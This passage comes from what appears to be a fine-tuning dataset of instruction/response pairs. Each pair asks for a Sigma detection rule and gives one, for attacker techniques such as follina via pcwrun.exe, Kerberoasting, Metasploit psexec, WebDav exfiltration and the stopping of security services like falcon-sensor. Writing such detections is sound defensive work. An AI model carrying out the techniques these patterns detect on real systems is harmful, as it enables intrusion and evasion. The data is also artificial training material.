    "instruction": "Build a Sigma rule with the goal of detecting using SettingSyncHost.exe to run hijacked binary.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect using SettingSyncHost.exe to run hijacked binary, you should: focus on monitoring process creation events within the Windows operating system. Specifically, analyze processes that are not initiated from the common system directories, C:\\Windows\\System32\\ or C:\\Windows\\SysWOW64\\. Instead, look for instances where the process parent command line includes 'cmd.exe /c' alongside 'RoamDiag.cmd' and the '-outputpath' argument. This unusual combination, especially not originating from standard system utilities, indicates that the SettingSyncHost.exe could be misused to execute unauthorized or hijacked binaries. Pay attention to fields such as TargetFilename and Image during the analysis. Despite the potential for unknown false positives, the severity of this behavior is considered high, implying its critical impact on security if detected.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    system_utility:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n    parent_is_settingsynchost:\n        ParentCommandLine|contains|all:\n            - 'cmd.exe /c'\n            - 'RoamDiag.cmd'\n            - '-outputpath'\n    condition: not system_utility and parent_is_settingsynchost\nfields:\n    - TargetFilename\n    - Image\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    system_utility:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n    parent_is_settingsynchost:\n        ParentCommandLine|contains|all:\n            - 'cmd.exe /c'\n            - 'RoamDiag.cmd'\n            - '-outputpath'\n    condition: not system_utility and parent_is_settingsynchost\nfields:\n    - TargetFilename\n    - Image\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "using SettingSyncHost.exe to run hijacked binary",
      "answer": "In order to detect using SettingSyncHost.exe to run hijacked binary, you should: focus on monitoring process creation events within the Windows operating system. Specifically, analyze processes that are not initiated from the common system directories, C:\\Windows\\System32\\ or C:\\Windows\\SysWOW64\\. Instead, look for instances where the process parent command line includes 'cmd.exe /c' alongside 'RoamDiag.cmd' and the '-outputpath' argument. This unusual combination, especially not originating from standard system utilities, indicates that the SettingSyncHost.exe could be misused to execute unauthorized or hijacked binaries. Pay attention to fields such as TargetFilename and Image during the analysis. Despite the potential for unknown false positives, the severity of this behavior is considered high, implying its critical impact on security if detected."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Malleable Amazon Profile.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Malleable Amazon Profile, you should: Focus on monitoring web proxy logs for specific patterns of behavior that could indicate manipulation or malicious activity related to Amazon profiles. Specifically, look for web traffic that has the following characteristics: \n\n1. The User-Agent string matches 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', which is commonly used by web browsers but can be mimicked by scripts or tools attempting to disguise malicious traffic as legitimate.\n\n2. The method of the request is either 'GET' or 'POST'. The 'GET' method is specifically used to request data from the specified resource, '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books', at 'www.amazon.com' and may include a cookie that ends with '=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996'. This could indicate an attempt to search or manipulate Amazon book listings or profiles in a manner not typical of standard user behavior.\n\n3. Alternatively, the 'POST' method targeting the resource '/N4215/adj/amzn.us.sr.aps' at 'www.amazon.com' might be observed. This action could represent attempts to post data to Amazon services, possibly for the purpose of profile manipulation or to interact with Amazon's systems in another unsanctioned way.\n\nGiven the high level of concern and the specific nature of these detections, they are tagged with relevant MITRE ATT&CK tactics and techniques commonly associated with Credential Access and Discovery, although specific tags are not mentioned. Be aware that there might be false positives, as some legitimate activities could inadvertently match these patterns under unknown circumstances. Continuous monitoring and analysis of proxy logs for these behaviors are crucial to identifying potential malleable Amazon profile activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection1:\n        c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'\n        cs-method: 'GET'\n        c-uri: '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books'\n        cs-host: 'www.amazon.com'\n        cs-cookie|endswith: '=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996'\n    selection2:\n        c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'\n        cs-method: 'POST'\n        c-uri: '/N4215/adj/amzn.us.sr.aps'\n        cs-host: 'www.amazon.com'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection1:\n        c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'\n        cs-method: 'GET'\n        c-uri: '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books'\n        cs-host: 'www.amazon.com'\n        cs-cookie|endswith: '=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996'\n    selection2:\n        c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'\n        cs-method: 'POST'\n        c-uri: '/N4215/adj/amzn.us.sr.aps'\n        cs-host: 'www.amazon.com'\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Malleable Amazon Profile",
      "answer": "In order to detect Malleable Amazon Profile, you should: Focus on monitoring web proxy logs for specific patterns of behavior that could indicate manipulation or malicious activity related to Amazon profiles. Specifically, look for web traffic that has the following characteristics: \n\n1. The User-Agent string matches 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', which is commonly used by web browsers but can be mimicked by scripts or tools attempting to disguise malicious traffic as legitimate.\n\n2. The method of the request is either 'GET' or 'POST'. The 'GET' method is specifically used to request data from the specified resource, '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books', at 'www.amazon.com' and may include a cookie that ends with '=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996'. This could indicate an attempt to search or manipulate Amazon book listings or profiles in a manner not typical of standard user behavior.\n\n3. Alternatively, the 'POST' method targeting the resource '/N4215/adj/amzn.us.sr.aps' at 'www.amazon.com' might be observed. This action could represent attempts to post data to Amazon services, possibly for the purpose of profile manipulation or to interact with Amazon's systems in another unsanctioned way.\n\nGiven the high level of concern and the specific nature of these detections, they are tagged with relevant MITRE ATT&CK tactics and techniques commonly associated with Credential Access and Discovery, although specific tags are not mentioned. Be aware that there might be false positives, as some legitimate activities could inadvertently match these patterns under unknown circumstances. Continuous monitoring and analysis of proxy logs for these behaviors are crucial to identifying potential malleable Amazon profile activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database, you should: Look for processes that have been created on Windows systems which either have an Image name ending with '\\ADExplorer.exe' or an OriginalFileName value of 'AdExp'. Additionally, check if the CommandLine argument contains the substring 'snapshot'. This detection aims at identifying instances where ADExplorer, a tool made by Sysinternals, is utilized in ways that potentially could be part of unauthorized or malicious activities, specifically focusing on capturing snapshots of the Active Directory database. The targeted log source for this detection is process creation events on Windows systems. It's important to note that the confidence level of this rule is marked as medium, and situations not fitting the described pattern could arise, leading to unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database.",
      "answer": "In order to detect the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database, you should: Look for processes that have been created on Windows systems which either have an Image name ending with '\\ADExplorer.exe' or an OriginalFileName value of 'AdExp'. Additionally, check if the CommandLine argument contains the substring 'snapshot'. This detection aims at identifying instances where ADExplorer, a tool made by Sysinternals, is utilized in ways that potentially could be part of unauthorized or malicious activities, specifically focusing on capturing snapshots of the Active Directory database. The targeted log source for this detection is process creation events on Windows systems. It's important to note that the confidence level of this rule is marked as medium, and situations not fitting the described pattern could arise, leading to unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module, you should: Monitor Windows systems for the creation of processes where the command line involves 'rundll32.exe' or 'rundll32' without any accompanying parameters. This monitoring should be done on systems that are capable of logging process creation events. Specifically, focus on capturing details such as the computer name, the username initiating the process, the exact command line used, and both the image path of the created process and the parent process's image path. Be aware that there might be instances where legitimate use of 'rundll32' without parameters is flagged by this detection approach; these are considered false positives. The significance of carefully monitoring for this activity is high due to its association with a known exploit technique.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - 'rundll32.exe'\n            - 'rundll32'\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectUserName\n    - CommandLine\n    - Image\n    - ParentImage\nfalsepositives:\n    - False positives may occur if a user called rundll32 from CLI with no options\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - 'rundll32.exe'\n            - 'rundll32'\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectUserName\n    - CommandLine\n    - Image\n    - ParentImage\nfalsepositives:\n    - False positives may occur if a user called rundll32 from CLI with no options\nlevel: high\n",
      "question": "rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module",
      "answer": "In order to detect rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module, you should: Monitor Windows systems for the creation of processes where the command line involves 'rundll32.exe' or 'rundll32' without any accompanying parameters. This monitoring should be done on systems that are capable of logging process creation events. Specifically, focus on capturing details such as the computer name, the username initiating the process, the exact command line used, and both the image path of the created process and the parent process's image path. Be aware that there might be instances where legitimate use of 'rundll32' without parameters is flagged by this detection approach; these are considered false positives. The significance of carefully monitoring for this activity is high due to its association with a known exploit technique."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability, you should monitor for the creation of processes on Windows systems where the process name ends with '\\pcwrun.exe' and its command line arguments contain '../'. This activity suggests exploitation attempts utilizing the specified vulnerability in \"pcwrun.exe\", which is a part of the Windows operating environment. Careful observation of these process creation events can provide early warning of an attack leveraging this vulnerability. False positives are considered unlikely, indicating that such detection should be highly reliable. The severity level of this detection is considered high, underscoring the importance of promptly identifying and responding to these events.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcwrun.exe'\n        CommandLine|contains: '../'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\pcwrun.exe'\n        CommandLine|contains: '../'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability",
      "answer": "In order to detect indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability, you should monitor for the creation of processes on Windows systems where the process name ends with '\\pcwrun.exe' and its command line arguments contain '../'. This activity suggests exploitation attempts utilizing the specified vulnerability in \"pcwrun.exe\", which is a part of the Windows operating environment. Careful observation of these process creation events can provide early warning of an attack leveraging this vulnerability. False positives are considered unlikely, indicating that such detection should be highly reliable. The severity level of this detection is considered high, underscoring the importance of promptly identifying and responding to these events."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer.\nThis behavior is typically used during a kerberos or silver ticket attack.\nA successful execution will output the SPNs for the endpoint in question.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer, which is typically used during a Kerberos or silver ticket attack with the intent of outputting the SPNs for the endpoint in question, you should monitor Windows PowerShell script logs. Specifically, look for the execution of scripts that contain the text \"System.IdentityModel.Tokens.KerberosRequestorSecurityToken\" within the Script Block Logging feature of Windows. This feature must be enabled to catch such activities. The presence of this particular script text is a strong indicator of an attack aiming to exploit Kerberos for unauthorized access to resources by gathering the Service Principal Names. This detection is considered to be of a high level of importance due to its potential impact. Be aware that there might be cases (false positives) where the detection could be triggered without a malicious intent; however, such cases are unknown or very rare.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: System.IdentityModel.Tokens.KerberosRequestorSecurityToken\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains: System.IdentityModel.Tokens.KerberosRequestorSecurityToken\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer.\nThis behavior is typically used during a kerberos or silver ticket attack.\nA successful execution will output the SPNs for the endpoint in question.\n",
      "answer": "In order to utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer, which is typically used during a Kerberos or silver ticket attack with the intent of outputting the SPNs for the endpoint in question, you should monitor Windows PowerShell script logs. Specifically, look for the execution of scripts that contain the text \"System.IdentityModel.Tokens.KerberosRequestorSecurityToken\" within the Script Block Logging feature of Windows. This feature must be enabled to catch such activities. The presence of this particular script text is a strong indicator of an attack aiming to exploit Kerberos for unauthorized access to resources by gathering the Service Principal Names. This detection is considered to be of a high level of importance due to its potential impact. Be aware that there might be cases (false positives) where the detection could be triggered without a malicious intent; however, such cases are unknown or very rare."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting disabling security tools.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect disabling security tools, you should monitor Linux system logs, specifically focusing on syslog entries. Key indicators of this type of activity include log entries that contain phrases like \"stopping iptables,\" \"stopping ip6tables,\" \"stopping firewalld,\" \"stopping cbdaemon,\" and \"stopping falcon-sensor.\" These entries suggest actions that could disable vital security components on a Linux system, potentially making it more vulnerable to attacks. It is important to note, however, that there could be legitimate reasons for these actions, such as during routine administration tasks, so not every instance identified might indicate a security threat. The severity of these findings is considered medium, indicating that while this activity can be a serious security concern, context is key to understanding the risk it poses.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: syslog\ndetection:\n    keywords:\n        - 'stopping iptables'\n        - 'stopping ip6tables'\n        - 'stopping firewalld'\n        - 'stopping cbdaemon'\n        - 'stopping falcon-sensor'\n    condition: keywords\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: syslog\ndetection:\n    keywords:\n        - 'stopping iptables'\n        - 'stopping ip6tables'\n        - 'stopping firewalld'\n        - 'stopping cbdaemon'\n        - 'stopping falcon-sensor'\n    condition: keywords\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
      "question": "disabling security tools",
      "answer": "In order to detect disabling security tools, you should monitor Linux system logs, specifically focusing on syslog entries. Key indicators of this type of activity include log entries that contain phrases like \"stopping iptables,\" \"stopping ip6tables,\" \"stopping firewalld,\" \"stopping cbdaemon,\" and \"stopping falcon-sensor.\" These entries suggest actions that could disable vital security components on a Linux system, potentially making it more vulnerable to attacks. It is important to note, however, that there could be legitimate reasons for these actions, such as during routine administration tasks, so not every instance identified might indicate a security threat. The severity of these findings is considered medium, indicating that while this activity can be a serious security concern, context is key to understanding the risk it poses."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie.\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie, which could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server), you should: Monitor Windows process creation logs for instances where \"rundll32.exe\" is initiated, particularly observing if the image ends with '\\rundll32.exe' and matches the original file name 'RUNDLL32.EXE'. Additionally, check the command line for the specific pattern 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'. If both conditions are met, it might indicate potential malicious activity centered around data exfiltration or unauthorized code execution using WebDav. Note that the certainty level for these detections is considered medium, acknowledging there could be cases where such activity is benign and doesn't represent a security threat.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_cli:\n        CommandLine|contains: 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "\"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie.\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server).\n",
      "answer": "In order to detect \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like C:\\windows\\system32\\davclnt.dll,DavSetCookie, which could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server), you should: Monitor Windows process creation logs for instances where \"rundll32.exe\" is initiated, particularly observing if the image ends with '\\rundll32.exe' and matches the original file name 'RUNDLL32.EXE'. Additionally, check the command line for the specific pattern 'C:\\windows\\system32\\davclnt.dll,DavSetCookie'. If both conditions are met, it might indicate potential malicious activity centered around data exfiltration or unauthorized code execution using WebDav. Note that the certainty level for these detections is considered medium, acknowledging there could be cases where such activity is benign and doesn't represent a security threat."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services, you should: focus on monitoring process creation events within Linux systems. Specifically, watch for processes that are being initiated whose image names end with '/service', '/systemctl', or '/chkconfig'. Furthermore, scrutinize the command line arguments of these processes for the presence of strings such as 'stop' or 'disable', which indicate an attempt to halt or deactivate certain system services or tools. Be mindful, however, that such activities could also originate from legitimate administration tasks. This detection operates at a medium severity level, suggesting a balanced approach to alerting to avoid overwhelming security personnel with false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            - '/service'\n            - '/systemctl'\n            - '/chkconfig'\n        CommandLine|contains:\n            - 'stop'\n            - 'disable'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            - '/service'\n            - '/systemctl'\n            - '/chkconfig'\n        CommandLine|contains:\n            - 'stop'\n            - 'disable'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
      "question": "usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services",
      "answer": "In order to detect the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services, you should: focus on monitoring process creation events within Linux systems. Specifically, watch for processes that are being initiated whose image names end with '/service', '/systemctl', or '/chkconfig'. Furthermore, scrutinize the command line arguments of these processes for the presence of strings such as 'stop' or 'disable', which indicate an attempt to halt or deactivate certain system services or tools. Be mindful, however, that such activities could also originate from legitimate administration tasks. This detection operates at a medium severity level, suggesting a balanced approach to alerting to avoid overwhelming security personnel with false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a transfer lock was removed from a Route 53 domain, which is not advised unless there is an intention to transfer the domain to a different registrar, you should monitor AWS CloudTrail logs for any activity related to the disabling of a domain transfer lock. Specifically, look for events where the source is identified as route53.amazonaws.com with the event name DisableDomainTransferLock. It is crucial to consider that sometimes a domain transfer lock may be disabled legitimately by a system or network administrator. Therefore, verify if the user identity, user agent, and/or hostname that initiated the action is recognized and should have the authority to make such changes within your environment. Any activity conducted by unfamiliar users or systems should be scrutinized. If certain activities are known and expected, causing false alarms, they can be excluded to avoid unnecessary alerts. This approach is established with a low level of alarm due to the potential for legitimate administrative actions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: route53.amazonaws.com\n        eventName: DisableDomainTransferLock\n    condition: selection\nfalsepositives:\n    - A domain transfer lock may be disabled by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Activity from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: route53.amazonaws.com\n        eventName: DisableDomainTransferLock\n    condition: selection\nfalsepositives:\n    - A domain transfer lock may be disabled by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Activity from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: low\n",
      "question": "transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar.",
      "answer": "In order to detect when a transfer lock was removed from a Route 53 domain, which is not advised unless there is an intention to transfer the domain to a different registrar, you should monitor AWS CloudTrail logs for any activity related to the disabling of a domain transfer lock. Specifically, look for events where the source is identified as route53.amazonaws.com with the event name DisableDomainTransferLock. It is crucial to consider that sometimes a domain transfer lock may be disabled legitimately by a system or network administrator. Therefore, verify if the user identity, user agent, and/or hostname that initiated the action is recognized and should have the authority to make such changes within your environment. Any activity conducted by unfamiliar users or systems should be scrutinized. If certain activities are known and expected, causing false alarms, they can be excluded to avoid unnecessary alerts. This approach is established with a low level of alarm due to the potential for legitimate administrative actions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting system changes made by Blue Mockingbird.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect system changes made by Blue Mockingbird, you should monitor the Windows Registry for specific modifications that are indicative of this attack. Specifically, focus on the registry setting events where the value is being set (Setvalue EventType). The critical alteration to lookout for occurs in the registry key path that ends with '\\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll'. This particular change is a common tactic used by Blue Mockingbird to achieve persistence and control over a compromised system by potentially modifying the referenced DLL to one under their control. \n\nMonitoring for such alterations will require configuring your security systems to log and alert whenever this type of registry modification occurs. It's important to be aware that, as of the knowledge available, there are no known false positives associated with this detection strategy, indicating a high level of confidence in these specific modifications as indicators of Blue Mockingbird activity. However, always exercise caution and investigate alerts thoroughly to confirm malicious activity. This detection strategy is of high importance due to the direct association with Blue Mockingbird's technique for maintaining persistence and potentially executing unauthorized commands or software on the system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|endswith: '\\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: Setvalue\n        TargetObject|endswith: '\\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "system changes made by Blue Mockingbird",
      "answer": "In order to detect system changes made by Blue Mockingbird, you should monitor the Windows Registry for specific modifications that are indicative of this attack. Specifically, focus on the registry setting events where the value is being set (Setvalue EventType). The critical alteration to lookout for occurs in the registry key path that ends with '\\CurrentControlSet\\Services\\wercplsupport\\Parameters\\ServiceDll'. This particular change is a common tactic used by Blue Mockingbird to achieve persistence and control over a compromised system by potentially modifying the referenced DLL to one under their control. \n\nMonitoring for such alterations will require configuring your security systems to log and alert whenever this type of registry modification occurs. It's important to be aware that, as of the knowledge available, there are no known false positives associated with this detection strategy, indicating a high level of confidence in these specific modifications as indicators of Blue Mockingbird activity. However, always exercise caution and investigate alerts thoroughly to confirm malicious activity. This detection strategy is of high importance due to the direct association with Blue Mockingbird's technique for maintaining persistence and potentially executing unauthorized commands or software on the system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect set DisallowRun to 1 to prevent user running specific computer program.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect set DisallowRun to 1 to prevent user running specific computer program, you should: Monitor the Windows registry for modifications where an event of type SetValue targets the specific registry key path ending with 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'. Specifically, detect changes where the Details of the modification suggest that the DisallowRun feature is being enabled, indicated by setting its value to 'DWORD (0x00000001)'. This action can potentially restrict users from running certain programs, which might be indicative of a system configuration change with potentially malicious intent or unauthorized control. It's important to note that false positives may exist as the exact intentions behind changing this setting can vary. The detection operates at a medium level of significance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'\n        Details: 'DWORD (0x00000001)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'\n        Details: 'DWORD (0x00000001)'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect set DisallowRun to 1 to prevent user running specific computer program",
      "answer": "In order to detect set DisallowRun to 1 to prevent user running specific computer program, you should: Monitor the Windows registry for modifications where an event of type SetValue targets the specific registry key path ending with 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun'. Specifically, detect changes where the Details of the modification suggest that the DisallowRun feature is being enabled, indicated by setting its value to 'DWORD (0x00000001)'. This action can potentially restrict users from running certain programs, which might be indicative of a system configuration change with potentially malicious intent or unauthorized control. It's important to note that false positives may exist as the exact intentions behind changing this setting can vary. The detection operates at a medium level of significance."
    }
  },
  {
